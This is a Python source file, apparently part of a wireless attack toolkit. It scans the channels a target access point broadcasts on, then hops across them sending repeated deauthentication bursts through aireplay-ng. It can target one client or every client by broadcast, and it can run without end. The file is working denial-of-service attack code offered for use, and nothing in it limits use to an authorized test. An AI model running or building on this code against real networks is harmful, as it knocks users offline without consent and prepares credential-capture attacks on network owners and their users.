"""
channel_hop.py — Channel-hopping deauthentication for multi-channel
enterprise deployments. Hops through specified channels, sending
deauth bursts on each with configurable dwell time.
"""

import subprocess
import time
import os

# Common 2.4GHz and 5GHz enterprise channels
DEFAULT_CHANNELS_24 = [1, 6, 11]
DEFAULT_CHANNELS_5  = [36, 40, 44, 48, 149, 153, 157, 161]
ALL_DEFAULT = DEFAULT_CHANNELS_24 + DEFAULT_CHANNELS_5


def set_channel(iface, channel):
    """Set the monitor-mode interface to a specific channel."""
    subprocess.run(
        ["iwconfig", iface, "channel", str(channel)],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


def deauth_burst(iface, bssid, client=None, count=20):
    """Send a burst of deauth frames using aireplay-ng."""
    cmd = [
        "aireplay-ng",
        "--deauth", str(count),
        "-a", bssid,
    ]
    if client:
        cmd += ["-c", client]
    cmd.append(iface)

    subprocess.run(
        cmd,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


def channel_hop_deauth(iface, bssid, client=None, channels=None,
                       dwell=2.0, burst=10, rounds=0):
    """
    Hop through channels, sending deauth bursts on each.

    Args:
        iface:    Monitor-mode interface
        bssid:    Target AP BSSID
        client:   Target client MAC (None = broadcast)
        channels: List of channels to hop (default: common enterprise channels)
        dwell:    Seconds to stay on each channel
        burst:    Number of deauth frames per channel
        rounds:   Number of full rounds (0 = infinite until Ctrl+C)
    """

    if channels is None:
        channels = DEFAULT_CHANNELS_24  # 2.4GHz by default

    target_label = client if client else "ALL (broadcast)"
    mode_label = f"{rounds} round(s)" if rounds > 0 else "Continuous"

    print(f"\n[*] Channel-Hop Deauth")
    print(f"[*] Target AP:  {bssid}")
    print(f"[*] Client:     {target_label}")
    print(f"[*] Channels:   {channels}")
    print(f"[*] Dwell:      {dwell}s per channel | Burst: {burst} frames")
    print(f"[*] Mode:       {mode_label} | Ctrl+C to stop\n")

    round_count = 0

    try:
        while True:
            round_count += 1
            if rounds > 0 and round_count > rounds:
                break

            for ch in channels:
                set_channel(iface, ch)
                print(f"    [ch {ch:>3}] Deauthing {bssid}...", end="", flush=True)
                deauth_burst(iface, bssid, client, burst)
                print(f" ✓ ({burst} frames)")
                time.sleep(dwell)

            if rounds > 0:
                print(f"[*] Round {round_count}/{rounds} complete")

    except KeyboardInterrupt:
        print(f"\n\n[*] Channel-hop deauth stopped after {round_count} round(s)")

    print(f"[+] Total: {round_count * len(channels) * burst} deauth frames sent")


def scan_ap_channels(iface, bssid, duration=10):
    """
    Scan to find which channels a specific BSSID operates on.
    Useful for multi-channel enterprise APs (e.g., same SSID on ch1, ch6, ch11).
    """

    print(f"[*] Scanning channels for BSSID {bssid} ({duration}s)...")

    out_file = "/tmp/eapx_chscan"

    # Clean old files
    for f in [f for f in os.listdir("/tmp") if f.startswith("eapx_chscan")]:
        try:
            os.remove(os.path.join("/tmp", f))
        except OSError:
            pass

    proc = subprocess.Popen(
        [
            "airodump-ng", iface,
            "--bssid", bssid,
            "--output-format", "csv",
            "-w", out_file,
            "--write-interval", "1",
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    time.sleep(duration)
    proc.terminate()
    time.sleep(1)

    channels = set()
    csv_file = out_file + "-01.csv"

    if os.path.exists(csv_file):
        with open(csv_file, "r", errors="ignore") as f:
            for line in f:
                parts = [p.strip() for p in line.split(",")]
                if len(parts) >= 4 and parts[0].replace(":", "").replace("-", "").isalnum():
                    if bssid.lower() in parts[0].lower():
                        try:
                            channels.add(int(parts[3].strip()))
                        except (ValueError, IndexError):
                            pass

    if channels:
        print(f"[+] BSSID {bssid} found on channels: {sorted(channels)}")
    else:
        print(f"[!] Could not detect channels — using defaults")
        channels = set(DEFAULT_CHANNELS_24)

    # Cleanup
    try:
        os.remove(csv_file)
    except OSError:
        pass

    return sorted(channels)
